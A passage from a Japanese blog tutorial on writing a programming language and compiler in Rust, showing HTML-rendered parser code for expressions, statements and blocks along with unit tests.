<span id="cb32-49"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-49" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>Lhs(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned()))</span>
<span id="cb32-50"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-50" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-51"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-51" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-52"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-53"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-53" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-54"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-54" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-55"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-55" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-56"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-56" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>PlusEq<span class="op">,</span></span>
<span id="cb32-57"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-57" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)</span>
<span id="cb32-58"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-58" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-59"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-59" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-60"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-60" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-61"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-61" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb32-62"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-62" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-63"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-63" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-64"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-64" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-65"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-65" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-66"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-66" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Star<span class="op">,</span></span>
<span id="cb32-67"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-67" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-68"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-68" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>PlusEq<span class="op">,</span></span>
<span id="cb32-69"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-69" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)</span>
<span id="cb32-70"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-70" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-71"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-71" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-72"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-72" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-73"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-73" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span>Dereference(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb32-74"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-74" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-75"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-75" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-76"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-77"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-77" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-78"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-78" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-79"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-79" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-80"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-80" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>MinusEq<span class="op">,</span></span>
<span id="cb32-81"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-81" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)</span>
<span id="cb32-82"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-82" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-83"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-83" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-84"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-84" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-85"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-85" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>AssignSub(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb32-86"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-86" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-87"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-87" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-88"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-88" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-89"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-89" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-90"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-90" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Star<span class="op">,</span></span>
<span id="cb32-91"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-91" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-92"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-92" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>MinusEq<span class="op">,</span></span>
<span id="cb32-93"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-93" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)</span>
<span id="cb32-94"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-94" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-95"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-95" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-96"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-96" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-97"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-97" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>AssignSub(<span class="pp">Lhs::</span>Dereference(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb32-98"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-98" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-99"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-99" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-100"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-100" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-101"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-101" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-102"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-102" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-103"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-103" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-104"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-104" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>ParenOpen<span class="op">,</span></span>
<span id="cb32-105"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-105" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>ParenClose</span>
<span id="cb32-106"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-106" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-107"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-107" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb32-108"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-108" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb32-109"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-109" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Expression::</span>FunctionCall(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned()))</span>
<span id="cb32-110"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-110" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb32-111"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-111" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-112"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-112" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb32-113"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-113" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb32-114"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-114" aria-hidden="true" tabindex="-1"></a>        expression(<span class="op">&amp;</span>[</span>
<span id="cb32-115"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-115" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-116"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-116" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>MinusEq<span class="op">,</span></span>
<span id="cb32-117"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-117" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb32-118"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-118" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb32-119"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-119" aria-hidden="true" tabindex="-1"></a>        <span class="cn">None</span></span>
<span id="cb32-120"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-120" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb32-121"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb32-121" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>こんな感じにほかのも実装していきます。</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb33-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> statement(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statement)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> expression_s(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statement)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-3" aria-hidden="true" tabindex="-1"></a>        expression(tokens)<span class="op">.</span>and_then(<span class="op">|</span>(t<span class="op">,</span> e)<span class="op">|</span> <span class="cf">match</span> t<span class="op">.</span>first() <span class="op">{</span></span>
<span id="cb33-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-4" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Some</span>(<span class="pp">Token::</span>Semi) <span class="op">=&gt;</span> <span class="cn">Some</span>((<span class="op">&amp;</span>t[<span class="dv">1</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Statement::</span>Expression(e)))<span class="op">,</span></span>
<span id="cb33-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-5" aria-hidden="true" tabindex="-1"></a>            _ <span class="op">=&gt;</span> <span class="cn">None</span><span class="op">,</span></span>
<span id="cb33-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-6" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span>)</span>
<span id="cb33-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb33-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> block_s(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statement)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-10" aria-hidden="true" tabindex="-1"></a>        block(tokens)<span class="op">.</span>map(<span class="op">|</span>(tokens<span class="op">,</span> b)<span class="op">|</span> (tokens<span class="op">,</span> <span class="pp">Statement::</span>Block(<span class="dt">Box</span><span class="pp">::</span>new(b))))</span>
<span id="cb33-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb33-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> while_s(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statement)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">match</span> tokens<span class="op">.</span>first() <span class="op">{</span></span>
<span id="cb33-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-15" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Some</span>(<span class="pp">Token::</span>While) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb33-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-16" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> (tokens<span class="op">,</span> e) <span class="op">=</span> expression(<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>])<span class="op">?;</span></span>
<span id="cb33-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-17" aria-hidden="true" tabindex="-1"></a>                <span class="kw">let</span> (tokens<span class="op">,</span> b) <span class="op">=</span> block(tokens)<span class="op">?;</span></span>
<span id="cb33-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-18" aria-hidden="true" tabindex="-1"></a>                <span class="cn">Some</span>((tokens<span class="op">,</span> <span class="pp">Statement::</span>While(e<span class="op">,</span> <span class="dt">Box</span><span class="pp">::</span>new(b))))</span>
<span id="cb33-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-19" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb33-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-20" aria-hidden="true" tabindex="-1"></a>            _ <span class="op">=&gt;</span> <span class="cn">None</span><span class="op">,</span></span>
<span id="cb33-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb33-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb33-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-24" aria-hidden="true" tabindex="-1"></a>    expression_s(tokens)</span>
<span id="cb33-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-25" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span>or_else(<span class="op">||</span> block_s(tokens))</span>
<span id="cb33-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-26" aria-hidden="true" tabindex="-1"></a>        <span class="op">.</span>or_else(<span class="op">||</span> while_s(tokens))</span>
<span id="cb33-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-27" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-29" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb33-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-30" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_statement() <span class="op">{</span></span>
<span id="cb33-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-31" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb33-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-32" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-34" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> statements(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statements)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-35" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> statements_inner(init<span class="op">:</span> (<span class="op">&amp;</span>[Token]<span class="op">,</span> Statements)) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Statements)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">match</span> statement(init<span class="op">.</span><span class="dv">0</span>) <span class="op">{</span></span>
<span id="cb33-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-37" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Some</span>((tokens<span class="op">,</span> s)) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb33-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-38" aria-hidden="true" tabindex="-1"></a>                statements_inner((tokens<span class="op">,</span> <span class="pp">Statements::</span>Statements(<span class="dt">Box</span><span class="pp">::</span>new(init<span class="op">.</span><span class="dv">1</span>)<span class="op">,</span> s)))</span>
<span id="cb33-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-39" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb33-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-40" aria-hidden="true" tabindex="-1"></a>            _ <span class="op">=&gt;</span> <span class="cn">Some</span>(init)<span class="op">,</span></span>
<span id="cb33-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-41" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb33-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-42" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb33-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-44" aria-hidden="true" tabindex="-1"></a>    statement(tokens)<span class="op">.</span>and_then(<span class="op">|</span>(tokens<span class="op">,</span> s)<span class="op">|</span> statements_inner((tokens<span class="op">,</span> <span class="pp">Statements::</span>Statement(s))))</span>
<span id="cb33-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-47"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-47" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb33-48"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-48" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_statements() <span class="op">{</span></span>
<span id="cb33-49"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-49" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb33-50"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-50" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-51"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-52"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-52" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> block(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Block)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-53"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-53" aria-hidden="true" tabindex="-1"></a>    tokens<span class="op">.</span>first()<span class="op">.</span>filter(<span class="op">|</span>t<span class="op">|</span> <span class="op">**</span>t <span class="op">==</span> <span class="pp">Token::</span>CurlyOpen)<span class="op">?;</span></span>
<span id="cb33-54"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-54" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> (tokens<span class="op">,</span> s) <span class="op">=</span> statements(<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>])<span class="op">?;</span></span>
<span id="cb33-55"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-55" aria-hidden="true" tabindex="-1"></a>    tokens<span class="op">.</span>first()<span class="op">.</span>filter(<span class="op">|</span>t<span class="op">|</span> <span class="op">**</span>t <span class="op">==</span> <span class="pp">Token::</span>CurlyClose)<span class="op">?;</span></span>
<span id="cb33-56"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-56" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Some</span>((<span class="op">&amp;</span>tokens[<span class="dv">1</span><span class="op">..</span>]<span class="op">,</span> <span class="pp">Block::</span>Statements(s)))</span>
